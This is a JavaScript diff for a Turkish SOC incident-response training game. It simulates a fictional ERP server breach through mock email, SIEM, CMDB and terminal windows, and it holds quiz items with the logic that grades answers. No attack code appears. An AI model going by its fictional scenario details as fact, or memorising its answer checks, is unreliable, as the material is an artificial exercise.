+  function addEvidence(id) {
+    if (hasEv(id) || !EVIDENCE_DEF[id]) return false;
+    S.evidence.push(id);
+    $("evCount").textContent = S.evidence.length;
+    notifyEvidenceFound(id, true);
+    if (isEvidenceBagSeen()) clearEvidenceReminder();
+    refreshWindow("evidence");
+    updateMissionDesk();
+    return true;
+  }
+
+  function isAppUnlocked(id) {
+    return !!APP_DEFS[id];
+  }
+
+  function quizExplainBlock(quizId, wrongIdx) {
+    var ex = QUIZ_EXPLAIN[quizId];
+    if (!ex) return "";
+    var extra = wrongIdx != null && ex.wrong && ex.wrong[wrongIdx] ? "<p>" + esc(ex.wrong[wrongIdx]) + "</p>" : "";
+    return '<div class="quiz-explain" id="' + quizId + '-explain"><b>✗ Yanlış cevap — doğru yaklaşım</b>' + esc(ex.text) + extra +
+      '<p style="margin-top:8px;font-size:11px;opacity:.85">Bu soruda tekrar cevap veremezsiniz. Diğer görevleri tamamlayıp <b>Devam Et</b> ile ilerleyebilirsiniz.</p></div>';
+  }
+
+  function gapExplainBlock() {
+    return '<div class="quiz-explain" id="gap-explain"><b>✗ Eşleştirme hatalı — doğru «Kör etti» sütunu</b><ul>' +
+      GAP_ROWS.map(function (r) {
+        return "<li><b>" + esc(r.gap) + "</b> → " + esc(r.blind) + "</li>";
+      }).join("") + "</ul><p>Doğru eşleştirmeler yukarıdadır. Bu soruda tekrar cevap veremezsiniz. <b>Devam Et</b> ile ilerleyebilirsiniz.</p></div>";
+  }
+
+  function prioExplainBlock() {
+    var by = { urgent: [], week: [], month: [] };
+    PRIO_ITEMS.forEach(function (p) { by[p.cat].push(p.text); });
+    return '<div class="quiz-explain" id="prio-explain"><b>✗ Önceliklendirme hatalı</b>' +
+      "<p><b>Acil:</b> " + esc(by.urgent.join(" · ")) + "</p>" +
+      "<p><b>Bu hafta:</b> " + esc(by.week.join(" · ")) + "</p>" +
+      "<p><b>Bu ay:</b> " + esc(by.month.join(" · ")) + "</p>" +
+      "<p>Bu soruda tekrar sürükleyemezsiniz. <b>Devam Et</b> ile ilerleyebilirsiniz.</p></div>";
+  }
+
+  function timelineExplainBlock() {
+    return '<div class="quiz-explain" id="tl-explain"><b>✗ Kronolojik sıra hatalı — doğru sıra</b><ol>' +
+      TL_ORDER.map(function (id, i) {
+        var e = TL_EVENTS.find(function (x) { return x.id === id; });
+        return "<li>" + esc(e.time) + " — " + esc(e.text) + "</li>";
+      }).join("") + "</ol><p>Bu soruda tekrar cevap veremezsiniz. <b>Devam Et</b> ile ilerleyebilirsiniz.</p></div>";
+  }
+
+  function handleQuizCorrect(quizId, btn, meta, onCorrect, refreshFn) {
+    var q = $(quizId);
+    S.flags[meta.flag] = true;
+    S.flags[quizId + "_locked"] = false;
+    S.flags[quizId + "_wrong"] = false;
+    delete S.flags[quizId + "_wrongIdx"];
+    if (q) {
+      q.querySelectorAll(".choice").forEach(function (b) {
+        b.disabled = true;
+        b.classList.remove("reveal-ok");
+      });
+      btn.classList.add("pok");
+      btn.disabled = true;
+    }
+    var exEl = $(quizId + "-explain");
+    if (exEl) exEl.remove();
+    if (onCorrect) onCorrect();
+    if (refreshFn) refreshFn();
+    updateMissionDesk();
+  }
+
+  function handleQuizWrong(quizId, q, wrongBtn, wrongIdx, meta, onCorrect, refreshFn) {
+    if (S.flags[quizId + "_locked"] || S.flags[meta.flag]) return;
+    S.flags[quizId + "_locked"] = true;
+    S.flags[quizId + "_wrong"] = true;
+    S.flags[quizId + "_wrongIdx"] = wrongIdx;
+    S.flags[meta.flag] = true;
+    wrongBtn.classList.add("pbad");
+    var correctBtn = q.querySelector('.choice[data-i="' + meta.correct + '"]');
+    if (correctBtn) correctBtn.classList.add("pok");
+    q.querySelectorAll(".choice").forEach(function (b) { b.disabled = true; });
+    var card = q.closest(".card") || q.parentElement;
+    if (card && !$(quizId + "-explain")) {
+      card.insertAdjacentHTML("beforeend", quizExplainBlock(quizId, wrongIdx));
+    }
+    applyWrongAnswerPenalty(quizId);
+    clearMissionFbForWrongQuestion();
+    if (refreshFn) refreshFn();
+    updateMissionDesk();
+  }
+
+  function bindQuiz(quizId, onCorrect, refreshFn) {
+    var meta = QUIZ_META[quizId];
+    if (!meta) return;
+    var q = $(quizId);
+    if (!q) return;
+    q.querySelectorAll(".choice").forEach(function (btn) {
+      var idx = parseInt(btn.getAttribute("data-i"), 10);
+      if (S.flags[meta.flag]) {
+        btn.disabled = true;
+        if (idx === meta.correct) btn.classList.add("pok");
+        if (S.flags[quizId + "_wrong"] && idx === S.flags[quizId + "_wrongIdx"]) btn.classList.add("pbad");
+        return;
+      }
+      if (S.flags[quizId + "_locked"]) return;
+      btn.onclick = function () {
+        if (S.flags[meta.flag] || S.flags[quizId + "_locked"]) return;
+        if (idx === meta.correct) handleQuizCorrect(quizId, btn, meta, onCorrect, refreshFn);
+        else handleQuizWrong(quizId, q, btn, idx, meta, onCorrect, refreshFn);
+      };
+    });
+  }
+
+  function missionComplete() {
+    switch (S.scene) {
+      case 1: return S.flags.s1_siem && S.flags.s1_q;
+      case 2: return S.flags.s2_rsys_svc && S.flags.s2_rsys_conf && hasEv("ev1");
+      case 3: return S.flags.s3_audit_svc && S.flags.s3_audit_bin && S.flags.s3_q && hasEv("ev2");
+      case 4: return S.flags.s4_log && hasEv("ev3");
+      case 5: return S.flags.s5_fw && S.flags.s5_q && hasEv("ev7") && (hasEv("ev4") || S.flags.q5_wrong);
+      case 6: return S.flags.s6_view && S.flags.s6_q && hasEv("ev5");
+      case 7: return S.flags.s7_proxy && hasEv("ev6");
+      case 8: return S.flags.s8_done;
+      case 9: return S.flags.s9_done;
+      case 10: return S.flags.s10_done;
+      case 11: return S.flags.s11_done;
+      default: return false;
+    }
+  }
+
+  function formatShiftWallClock(elapsedSec) {
+    var totalMin = SHIFT_CLOCK_BASE_MIN + Math.floor(elapsedSec / 60);
+    var h = Math.floor(totalMin / 60) % 24;
+    var m = totalMin % 60;
+    return "Sal " + (h < 10 ? "0" : "") + h + ":" + (m < 10 ? "0" : "") + m;
+  }
+
+  function updateShiftWallClock(elapsedSec) {
+    var tb = $("tbClock");
+    if (tb) tb.textContent = formatShiftWallClock(elapsedSec);
+  }
+
+  function startChrono() {
+    S.chronoStart = Date.now();
+    if (S.chronoId) clearInterval(S.chronoId);
+    updateShiftWallClock(0);
+    S.chronoId = setInterval(function () {
+      var sec = Math.floor((Date.now() - S.chronoStart) / 1000);
+      var m = Math.floor(sec / 60), s = sec % 60;
+      var t = (m < 10 ? "0" : "") + m + ":" + (s < 10 ? "0" : "") + s;
+      var cd = $("chronoDesk"); if (cd) cd.textContent = t;
+      var ct = $("chronoTb"); if (ct) ct.textContent = t;
+      updateShiftWallClock(sec);
+    }, 1000);
+  }
+
+  function ensureBriefDefaults() {
+    S.flags.brief = S.flags.brief || {};
+    ["bulgu", "etki", "kanit", "oneri"].forEach(function (k) {
+      if (!(S.flags.brief[k] || "").trim()) S.flags.brief[k] = BRIEF_DEFAULTS[k];
+    });
+  }
+
+  function renderIcons() {
+    $("icons").innerHTML = APP_ORDER.map(function (id) {
+      var d = APP_DEFS[id];
+      var locked = !isAppUnlocked(id);
+      var cls = "dicon" + (S.selectedIcon === id ? " sel" : "") + (locked ? " locked" : "");
+      if (id === "mail" && !S.mailRead && !locked) cls += " pulse";
+      return '<div class="' + cls + '" data-id="' + id + '" ondblclick="KN.open(\'' + id + '\')" onclick="KN.selectIcon(\'' + id + '\')">' +
+        '<div class="dglyph">' + d.icon + '</div><div class="dlabel">' + esc(d.title.split("—")[0].trim()) + '</div></div>';
+    }).join("");
+  }
+
+  function renderStartMenu() {
+    $("startMenu").innerHTML = APP_ORDER.map(function (id) {
+      var d = APP_DEFS[id];
+      var locked = !isAppUnlocked(id);
+      return '<button type="button" class="' + (locked ? "locked" : "") + '" onclick="KN.open(\'' + id + '\');KN.toggleStart()">' + d.icon + " " + esc(d.title) + '</button>';
+    }).join("") + '<button type="button" onclick="KN.toggleStart()">İptal</button>';
+  }
+
+  function renderTaskbar() {
+    $("taskBtns").innerHTML = Object.keys(S.windows).map(function (id) {
+      var d = APP_DEFS[id];
+      var on = S.activeWindow === id && !S.minimized[id] ? " on" : "";
+      return '<button type="button" class="task-btn' + on + '" onclick="KN.restore(\'' + id + '\')">' + esc(d.title) + '</button>';
+    }).join("");
+    $("stageNum").textContent = S.scene;
+  }
+
+  function openWindow(id) {
+    if (id === "mail") { S.mailRead = true; renderIcons(); }
+    if (S.windows[id]) {
+      if (S.minimized[id]) { S.minimized[id] = false; $("win-" + id).classList.remove("hidden"); }
+      focusWindow(id); renderWindowBody(id); return;
+    }
+    var def = APP_DEFS[id];
+    S.windows[id] = true; S.z += 1;
+    var w = document.createElement("div");
+    w.className = "win"; w.id = "win-" + id;
+    w.style.cssText = "left:" + def.x + "px;top:" + def.y + "px;width:" + def.w + "px;height:" + def.h + "px;z-index:" + S.z;
+    w.innerHTML = '<div class="win-title" data-drag="' + id + '"><span>' + esc(def.icon + " " + def.title) + '</span>' +
+      '<button type="button" class="wctrl" onclick="KN.minimize(\'' + id + '\')">─</button>' +
+      '<button type="button" class="wctrl" onclick="KN.maximize(\'' + id + '\')">□</button>' +
+      '<button type="button" class="wctrl x" onclick="KN.close(\'' + id + '\')">×</button></div>' +
+      '<div class="win-body" id="body-' + id + '"></div>';
+    $("windows").appendChild(w);
+    bindDrag(id);
+    S.selectedIcon = id;
+    focusWindow(id);
+    renderWindowBody(id);
+    renderTaskbar();
+    renderIcons();
+  }
+
+  function bindDrag(id) {
+    var win = $("win-" + id), bar = win.querySelector(".win-title");
+    var dragging = false, ox, oy, sl, st;
+    bar.addEventListener("mousedown", function (e) {
+      if (e.target.classList.contains("wctrl") || S.maximized[id]) return;
+      dragging = true; focusWindow(id);
+      ox = e.clientX; oy = e.clientY; sl = win.offsetLeft; st = win.offsetTop;
+      e.preventDefault();
+    });
+    document.addEventListener("mousemove", function (e) {
+      if (!dragging) return;
+      win.style.left = (sl + e.clientX - ox) + "px";
+      win.style.top = (st + e.clientY - oy) + "px";
+    });
+    document.addEventListener("mouseup", function () { dragging = false; });
+    win.addEventListener("mousedown", function () { focusWindow(id); });
+  }
+
+  function focusWindow(id) {
+    S.activeWindow = id; S.z += 1;
+    var w = $("win-" + id); if (w) w.style.zIndex = S.z;
+    if (id === "evidence" && isEvidenceBagSeen()) clearEvidenceReminder();
+    renderTaskbar();
+  }
+
+  function closeWindow(id) {
+    var w = $("win-" + id); if (w) w.remove();
+    delete S.windows[id]; delete S.minimized[id]; delete S.maximized[id];
+    if (S.activeWindow === id) S.activeWindow = null;
+    renderTaskbar();
+  }
+
+  function minimizeWindow(id) {
+    S.minimized[id] = true;
+    $("win-" + id).classList.add("hidden");
+    if (id === "evidence" && S.evidenceReminderId) scheduleEvidenceReminder(S.evidenceReminderId);
+    renderTaskbar();
+  }
+
+  function maximizeWindow(id) {
+    var w = $("win-" + id); if (!w) return;
+    if (S.maximized[id]) {
+      S.maximized[id] = false; w.classList.remove("max");
+      var d = APP_DEFS[id];
+      w.style.width = d.w + "px"; w.style.height = d.h + "px";
+    } else { S.maximized[id] = true; w.classList.add("max"); }
+  }
+
+  function restoreWindow(id) {
+    if (S.minimized[id]) { S.minimized[id] = false; $("win-" + id).classList.remove("hidden"); }
+    focusWindow(id); renderWindowBody(id);
+  }
+
+  function refreshWindow(id) {
+    if (S.windows[id]) renderWindowBody(id);
+  }
+
+  function renderWindowBody(id) {
+    var body = $("body-" + id);
+    if (!body) return;
+    var r = { mail: renderMail, siem: renderSiem, assets: renderAssets, terminal: renderTerminal,
+      firewall: renderFirewall, proxy: renderProxy, evidence: renderEvidence, timeline: renderTimeline,
+      irportal: renderIrPortal, mission: renderMissionDesk };
+    if (r[id]) r[id](body);
+  }
+
+  function renderMail(body) {
+    body.innerHTML = '<div class="ol-app"><div class="ol-bar">📧 Microsoft Outlook — AktaşMakina</div><div class="ol-body">' +
+      '<div class="ol-side"><div class="on">Gelen Kutusu</div><div>Gönderilmiş</div><div>Silinmiş</div></div>' +
+      '<div class="ol-list"><div class="ol-item on unread"><b>[ACİL — YÖNETİM] ERP güvenlik olayı</b><br/>Emre Kılıç · 09:12</div></div>' +
+      '<div class="ol-read"><h3>[ACİL — YÖNETİM TALEBİ] Üretim ERP sunucusu güvenlik olayı — acil SOC değerlendirmesi</h3>' +
+      '<div class="ol-meta">Kimden: Dr. Emre Kılıç — Genel Müdür Yardımcısı (BT ve Dijital) &lt;emre.kilic@aktasmakina.com.tr&gt;<br/>' +
+      'Kime: SOC Vardiya · Bilgi Güvenliği · Cc: RedSentinel MSSP, IT Operasyonları · Salı 09:12 · <span class="tag crit">ACİL</span></div>' +
+      '<p>Sayın ' + esc(S.name) + ',</p>' +
+      '<p>Dün gece saat 02:41 civarında yönetilen güvenlik hizmeti sağlayıcımız <b>RedSentinel</b>, üretim ERP ortamımızdaki kritik sunucu <b>ERP-PROD-04 (10.12.4.55)</b> üzerinde yetkisiz erişim ve veri hareketi şüphesi bildirdi. Yönetim Kurulu bilgilendirildi; üretim planı ve müşteri sevkiyat süreçleri bu sunucuya bağlı olduğu için olay <b>en yüksek öncelik</b> sınıfındadır.</p>' +
+      '<p>RedSentinel ekibinin ilk değerlendirmesine göre dış IP <b>185.220.101.47</b> üzerinden SSH brute-force denemeleri, ardından <b>erpadmin</b> hesabıyla oturum açılması ve <b>/opt/erp/data/</b> dizininde toplama/aktarım izleri görülmüştür. Ancak şu an <b>Elastic SIEM konsolunda bu olaya ilişkin alarm üretilmediğini</b> bildiriyorlar — bu durum, olayın gerçekleşmediği anlamına gelmez; log veya telemetri akışında boşluk olabileceğini düşündürüyoruz.</p>' +
+      '<p><b>Özet teknik bilgi (RedSentinel):</b></p><ul>' +
+      '<li><b>Sistem:</b> ERP-PROD-04 · 10.12.4.55 · Ubuntu 22.04 LTS · Üretim segmenti</li>' +
+      '<li><b>İlk şüpheli oturum:</b> 14 Kasım 2024, 02:41 (UTC+3)</li>' +
+      '<li><b>Vektör:</b> SSH (port 22) · brute-force → başarılı giriş</li>' +
+      '<li><b>Şüpheli aktivite:</b> sudo ile root komutları, arşivleme (/tmp/.x11/), curl ile dış FTP hedefine yükleme</li></ul>' +
+      '<div class="ol-actions"><b>Sizden beklenenler (vardiya başlangıcı — bugün 09:17):</b><ol>' +
+      '<li>Elastic Security üzerinde saldırgan IP ve hedef sunucu için sorgu çalıştırın; alarm yoksa bunu «normal» kabul etmeyin.</li>' +
+      '<li>CMDB kaydını ve SIEM connector sağlığını kontrol edin; log akışının gerçekten gelip gelmediğini doğrulayın.</li>' +
+      '<li>Gerekirse sunucuya kontrollü erişimle yerel logları (auth, sistem, sudo) inceleyin ve kanıt toplayın.</li>' +
+      '<li>İlk bulguları Mission Desk üzerinden ilerletin; belirsizlik varsa erken IP bloklama yerine görünürlük ve kanıt odaklı kalın.</li></ol></div>' +
+      '<p>Lütfen <b>en geç 10:30</b>’a kadar «olay var mı / görünürlük nerede koptu» sorusuna net bir ön değerlendirme ile dönün. Üretim durdurma kararı yalnızca kanıtlanmış veri sızıntısı veya aktif tehdit tespiti halinde IT Operasyonları ile koordineli alınacaktır.</p>' +
+      '<p>Saygılarımla,<br/><b>Dr. Emre Kılıç</b><br/>Genel Müdür Yardımcısı — Bilgi Teknolojileri ve Dijital Dönüşüm<br/>AktaşMakina A.Ş.</p></div></div></div>';
+    S.flags.mail_open = true;
+  }
+
+  var SIEM_ATTACKER_IP = "185.220.101.47";
+  var SIEM_TARGET_IP = "10.12.4.55";
+
+  function isValidFwFilter(src, dst, port) {
+    var s = String(src || "").trim();
+    var d = String(dst || "").trim();
+    var p = String(port || "").trim().toLowerCase();
+    if (s !== SIEM_ATTACKER_IP || d !== SIEM_TARGET_IP) return false;
+    return p === "22" || p === "tcp/22" || p === "tcp:22";
+  }
+
+  function isValidSiemQuery(q) {
+    var s = String(q).trim().toLowerCase().replace(/\s+/g, " ");
+    if (!s) return false;
+    if (s.indexOf(SIEM_ATTACKER_IP) < 0 || s.indexOf(SIEM_TARGET_IP) < 0) return false;
+    if (!/\bor\b/.test(s)) return false;
+    return true;
+  }
+
+  function renderSiem(body) {
+    var searching = S.flags.s1_siemSearching;
+    var siemDone = S.flags.s1_siem;
+    var answered = S.flags.s1_q;
+    var savedQ = S.flags.s1_siemQuery || "";
+    var draftQ = S.flags.s1_siemDraft != null ? S.flags.s1_siemDraft : "";
+    var mainContent;
+    if (searching) {
+      mainContent =
+        '<div class="siem-loading">' +
+        '<div class="siem-spin"></div>' +
+        '<p><b>Sorgu çalışıyor…</b></p>' +
+        '<p class="small" style="color:#666">index: logs-* · shard routing · 13 Kas 23:00 → 15 Kas 06:00</p>' +
+        '<div class="siem-prog"><i></i></div>' +
+        '<p style="margin-top:12px;font-size:11px;color:#666;font-family:var(--mono)">' + esc(savedQ || draftQ) + '</p></div>';
+    } else if (siemDone) {
+      mainContent =
+        '<div class="query-bar"><span class="tag">13 Kas 23:00 → 15 Kas 06:00</span><span class="tag">847.219 olay tarandı</span></div>' +
+        '<table class="dt"><thead><tr><th>Sonuç</th><th>Süre</th></tr></thead><tbody>' +
+        '<tr><td style="color:var(--crit)"><b>0 alarm</b> bulundu</td><td>2,4 sn</td></tr></tbody></table>' +
+        (answered && !S.flags.q1_wrong ? '<p class="tag ok" style="margin-top:10px">✓ Görünürlük sorgusu tamamlandı</p>' : (siemDone ? renderQ1() : ""));
+    } else {
+      mainContent = '<div class="siem-empty">Discover KQL: dış kaynak ve üretim hedefi için alan bazlı sorgu yazın (src_ip veya source.ip · OR · dst_ip veya destination.ip). IP değerlerini vaka e-postasından alın.</div>';
+    }
+    var inputLocked = siemDone || searching;
+    body.innerHTML = '<div class="siem-app"><div class="siem-top"><span class="siem-logo">⚡ Elastic Security</span>' +
+      '<span class="tag" style="margin-left:8px">AktaşMakina · prod</span>' +
+      '<div class="siem-search"><input type="text" id="siemQueryInput" placeholder="KQL — e-postadaki kaynak ve hedef IP, OR operatörü" value="' + esc(inputLocked ? savedQ : draftQ) + '"' +
+      (inputLocked ? ' readonly' : '') + ' autocomplete="off" spellcheck="false" />' +
+      (inputLocked ? '' : '<button type="button" class="btn sm" id="btnSiemRun">Ara</button>') +
+      (searching ? '<span class="tag" style="margin-left:4px">Aranıyor…</span>' : '') +
+      '</div></div>' +
+      '<div style="display:flex;flex:1;min-height:0"><div style="width:120px;background:#15171c;border-right:1px solid #333;padding:8px 0;font-size:10px;color:#888;flex-shrink:0">' +
+      '<div style="padding:6px 10px;color:#00b488;font-weight:600">Discover</div><div style="padding:6px 10px">Alerts</div><div style="padding:6px 10px">Cases</div><div style="padding:6px 10px">Rules</div></div>' +
+      '<div class="siem-body" style="flex:1">' + mainContent + '</div></div></div>';
+    var inp = $("siemQueryInput");
+    if (inp && !inputLocked) {
+      inp.oninput = function () { S.flags.s1_siemDraft = inp.value; };
+      inp.onkeydown = function (ev) {
+        if (ev.key === "Enter") { ev.preventDefault(); runSiemSearch(); }
+      };
+    }
+    if (!siemDone && !searching) {
+      var b = $("btnSiemRun");
+      if (b) b.onclick = runSiemSearch;
+    }
+    if (siemDone && (!answered || S.flags.q1_wrong)) bindQ1();
+  }
+
+  function runSiemSearch() {
+    if (S.flags.s1_siem || S.flags.s1_siemSearching) return;
+    var inp = $("siemQueryInput");
+    var q = inp ? inp.value.trim() : (S.flags.s1_siemDraft || "").trim();
+    if (!isValidSiemQuery(q)) {
+      setMissionFb("Sorguda e-postadaki kaynak ve hedef adresleri ile OR operatörü olmalı (alan adı yazımı esnek).", "bad");
+      showToast("SIEM sorgusu eksik — e-postadaki IP'leri ve OR kullanımını kontrol edin", "warn");
+      if (inp) inp.focus();
+      return;
+    }
+    S.flags.s1_siemQuery = q;
+    S.flags.s1_siemDraft = q;
+    S.flags.s1_siemSearching = true;
+    refreshWindow("siem");
+    setTimeout(function () {
+      S.flags.s1_siemSearching = false;
+      S.flags.s1_siem = true;
+      setMissionFb("SIEM sorgusu tamamlandı: 0 alarm.", "warn");
+      showToast("SIEM: 0 alarm bulundu", "warn");
+      refreshWindow("siem");
+      refreshWindow("mission");
+    }, 2400);
+  }
+
+  function renderQ1() {
+    var locked = S.flags.q1_locked && S.flags.q1_wrong;
+    return '<div class="card" style="margin-top:12px"><h4>SIEM\'de alarm yok. Bu ne anlama gelir?</h4><div class="choices" id="q1">' +
+      ["A) Tehdit yoktur, rapor muhtemelen hatalıdır.", "B) Alarm yok ama log/telemetri eksik olabilir; görünürlük kontrolü yapılmalı.",
+       "C) Direkt firewall'dan IP bloklanmalı, analiz gerekmez.", "D) Bu artık sadece IT'nin sorunudur."].map(function (t, i) {
+        return '<button type="button" class="choice" data-i="' + i + '">' + esc(t) + '</button>';
+      }).join("") + "</div>" + (locked ? quizExplainBlock("q1") : "") + "</div>";
+  }
+
+  function bindQ1() {
+    bindQuiz("q1", function () {
+      setMissionFb("Görünürlük değerlendirmesi kaydedildi.", "ok");
+      showToast("Soru tamamlandı.", "ok");
+    }, function () { refreshWindow("siem"); });
+  }
+
+  function renderAssets(body) {
+    body.innerHTML = '<div class="sn-app"><div class="sn-bar">🗂️ ServiceNow — CMDB</div><div class="sn-body">' +
+      '<div class="sn-record"><h3 style="margin-bottom:10px;font-size:14px">ERP-PROD-04</h3>' +
+      '<div class="sn-field"><label>Hostname</label><span>ERP-PROD-04</span></div>' +
+      '<div class="sn-field"><label>IP Address</label><span>10.12.4.55</span></div>' +
+      '<div class="sn-field"><label>OS</label><span>Ubuntu 22.04 LTS</span></div>' +
+      '<div class="sn-field"><label>Segment</label><span>Üretim ağı</span></div>' +
+      '<div class="sn-field"><label>Kritiklik</label><span style="color:#c00;font-weight:700">Yüksek — Üretim ERP</span></div>' +
+      '<div class="sn-field"><label>Sahip</label><span>IT Operations / ERP Team</span></div>' +
+      '<div class="sn-health"><b style="color:#c00">⚠ SIEM Connector Health</b><br/>' +
+      'Kaynak: 10.12.4.55 · Son log: <b>9 Kas 16:42</b><br/>Tür: syslog application · Durum: <b>Son 7 günde log yok</b></div>' +
+      '</div></div></div>';
+    S.flags.assets_view = true;
+  }
+
+  function normCmd(line) {
+    return String(line).trim().toLowerCase().replace(/\s+/g, " ");
+  }
+
+  function syncS2Rsys() {
+    var was = !!S.flags.s2_rsys;
+    if (S.flags.s2_rsys_svc && S.flags.s2_rsys_conf) S.flags.s2_rsys = true;
+    if (!was && S.flags.s2_rsys) focusEvidenceBagForActions();
+  }
+
+  function syncS3Audit() {
+    var was = !!S.flags.s3_audit;
+    if (S.flags.s3_audit_svc && S.flags.s3_audit_bin) S.flags.s3_audit = true;
+    if (!was && S.flags.s3_audit) focusEvidenceBagForActions();
+  }
+
+  function shuffleIds(ids) {
+    var a = ids.slice();
+    for (var i = a.length - 1; i > 0; i--) {
+      var j = Math.floor(Math.random() * (i + 1));
+      var t = a[i]; a[i] = a[j]; a[j] = t;
+    }
+    return a;
+  }
+
+  function getTimelinePoolOrder() {
+    if (!S.flags.tl_pool_shuffle) {
+      S.flags.tl_pool_shuffle = shuffleIds(TL_EVENTS.map(function (e) { return e.id; }));
+    }
+    return S.flags.tl_pool_shuffle;
+  }
+
+  function toggleTimelinePick(id) {
+    if (S.flags.tl_locked) return;
+    S.flags.tl_order = S.flags.tl_order || [];
+    var idx = S.flags.tl_order.indexOf(id);
+    if (idx >= 0) S.flags.tl_order.splice(idx, 1);
+    else S.flags.tl_order.push(id);
+    refreshWindow("timeline");
+  }
+
+  function briefFieldsReady() {
+    var b = S.flags.brief || {};
+    return ["bulgu", "etki", "kanit", "oneri"].every(function (k) { return (b[k] || "").trim().length >= 40; });
+  }
+
+  function updateBriefBtn(root) {
+    var btn = root.querySelector("#btnBrief");
+    if (!btn) return;
+    btn.disabled = S.flags.s11_done || !briefFieldsReady();
+  }
+
+  function rsyslogConfTypo(c) {
+    return /^cat\s+\/etc\/rsyslog\.d\/siem-forward\.conf\.$/.test(c);
+  }
+
+  function rsyslogCompoundOk(c) {
+    return /systemctl\s+status\s+rsyslog/.test(c) && /;/.test(c) &&
+      /(?:^|;\s*)cat\s+\/etc\/rsyslog\.d\/siem-forward\.conf\s*$/.test(c);
+  }
+
+  var RSYSLOG_COMPOUND_OUT =
+    "erpadmin@ERP-PROD-04:~$ systemctl status rsyslog\n● rsyslog.service\n   Loaded: loaded (/lib/systemd/system/rsyslog.service; enabled; vendor preset: enabled)\n   Active: failed (Result: start-limit-hit) since Nov  9 16:41:22 UTC\n\n" +
+    "erpadmin@ERP-PROD-04:~$ cat /etc/rsyslog.d/siem-forward.conf\n*.* @@10.0.0.5:514   # SIEM collector IP";
+
+  function auditdInvalidSyntax(c) {
+    if (/\bve\b/.test(c)) return "ve";
+    if (/systemctl\s+status\s+auditd/.test(c) && /\|/.test(c) && /(?:which|command\s+-v)\s+auditctl/.test(c)) return "pipe";
+    if (/systemctl\s+status\s+auditd/.test(c) && /\band\b/.test(c) && /auditctl/.test(c)) return "and";
+    return null;
+  }
+
+  function auditdCompoundOk(c) {
+    return /systemctl\s+status\s+auditd/.test(c) && /;/.test(c) &&
+      /(?:^|;\s*)(?:which\s+auditctl|command\s+-v\s+auditctl)\s*$/.test(c);
+  }
+
+  var AUDITD_COMPOUND_OUT =
+    "erpadmin@ERP-PROD-04:~$ systemctl status auditd\nUnit auditd.service could not be found.\n\n" +
+    "erpadmin@ERP-PROD-04:~$ command -v auditctl\n\n" +
+    "erpadmin@ERP-PROD-04:~$ which auditctl\nauditctl not found";
+
+  var TERM_PROMPT = "erpadmin@ERP-PROD-04:~$ ";
+
+  /** activePrompt yalnızca geçmişin en sonunda; çalıştırma sırasında gösterilmez */
+  function termNormalizeLines() {
+    S.flags.termLines = S.flags.termLines || [];
+    var out = [];
+    S.flags.termLines.forEach(function (ln) {
+      if (ln.type !== "activePrompt") out.push(ln);
+    });
+    if (!S.flags.termBusy) out.push({ type: "activePrompt" });
+    S.flags.termLines = out;
+  }
+
+  function termStripPromptFromOut(out) {
+    var lines = String(out).split("\n");
+    if (lines[0] && lines[0].indexOf("erpadmin@") === 0) lines.shift();
+    while (lines.length && lines[lines.length - 1].trim() === "erpadmin@ERP-PROD-04:~$") lines.pop();
+    return lines.join("\n").trim();
+  }
+
+  function renderTerminal(body) {
+    S.flags.termLines = S.flags.termLines || [];
+    if (!S.flags.termWelcomeShown) {
+      S.flags.termWelcomeShown = true;
+      S.flags.termLines.push({ text: TERM_WELCOME, cls: "sys" });
+      S.flags.termLines.push({ type: "activePrompt" });
+    }
+    termNormalizeLines();
+    var hist = S.flags.termLines.map(function (ln) {
+      if (ln.type === "activePrompt") {
+        return '<div class="wt-line-prompt"><span class="wt-prompt-prefix">' + esc(TERM_PROMPT) + '</span>' +
+          '<input type="text" class="wt-inline-input" id="wtInput" autocomplete="off" spellcheck="false" aria-label="Komut satırı" /></div>';
+      }
+      if (ln.cls === "prompt") {
+        var full = ln.text || "";
+        var cmdPart = full.indexOf(TERM_PROMPT) === 0 ? full.slice(TERM_PROMPT.length) : full;
+        return '<div class="wt-line-prompt"><span class="wt-prompt-prefix">' + esc(TERM_PROMPT) + '</span>' +
+          '<span class="wt-cmd-text">' + esc(cmdPart) + '</span></div>';
+      }
+      return '<div class="wt-out' + (ln.cls ? " " + ln.cls : "") + '">' + esc(ln.text) + '</div>';
+    }).join("");
+    body.innerHTML =
+      '<div class="wt-app">' +
+      '<div class="wt-chrome"><span>⊞</span> <b>Windows Terminal</b> · OpenSSH · SOC-IR profili</div>' +
+      '<div class="wt-tabs"><span class="wt-tab on">erpadmin@10.12.4.55</span><span class="wt-tab">+</span></div>' +
+      '<div class="wt-body" id="wtScroll">' + hist + '</div></div>';
+    scrollTermToBottom();
+    var inp = $("wtInput");
+    if (inp) {
+      inp.onkeydown = function (ev) {
+        if (ev.key === "Enter") {
+          ev.preventDefault();
+          execTermLine(inp.value);
+        }
+      };
+      setTimeout(function () { inp.focus(); }, 50);
+    }
+  }
+
+  function appendTermScroll(htmlLines) {
+    S.flags.termLines = S.flags.termLines || [];
+    htmlLines.forEach(function (ln) { S.flags.termLines.push(ln); });
+  }
+
+  function termPopActivePrompt() {
+    S.flags.termLines = S.flags.termLines || [];
+    var last = S.flags.termLines[S.flags.termLines.length - 1];
+    if (last && last.type === "activePrompt") S.flags.termLines.pop();
+  }
+
+  function scrollTermToBottom() {
+    function go() {
+      var scroll = $("wtScroll");
+      if (scroll) scroll.scrollTop = scroll.scrollHeight;
+    }
+    requestAnimationFrame(function () {
+      requestAnimationFrame(go);
+    });
+  }
+
+  function execTermLine(line) {
+    var raw = String(line).trim();
+    if (!raw) return;
+    S.flags.termLines = S.flags.termLines || [];
+    termPopActivePrompt();
+    appendTermScroll([{ text: TERM_PROMPT + raw, cls: "prompt" }]);
+    S.flags.termBusy = true;
+    refreshWindow("terminal");
+    scrollTermToBottom();
+    var c = normCmd(raw);
+    var matched = null;
+    var finish = function () {
+      S.flags.termBusy = false;
+      refreshWindow("terminal");
+      scrollTermToBottom();
+    };
+    setTimeout(function () {
+      if (S.scene >= 2 && rsyslogConfTypo(c)) {
+        appendTermScroll([
+          { text: "cat: /etc/rsyslog.d/siem-forward.conf.: No such file or directory", cls: "err" },
+          { text: "💡 Dosya yolunda fazladan nokta var — SIEM forward yapılandırma dosyasının tam yolunu kontrol edin (detay: İpucu butonu).", cls: "sys" }
+        ]);
+        setMissionFb("Hatalı dosya yolu — SIEM forward yapılandırmasını doğru dosyadan okuyun.", "bad");
+        finish();
+        return;
+      }
+      if (S.scene >= 2 && rsyslogCompoundOk(c)) {
+        if (!S.flags.s2_rsys_compound) {
+          S.flags.s2_rsys_svc = true;
+          S.flags.s2_rsys_conf = true;
+          S.flags.s2_rsys_compound = true;
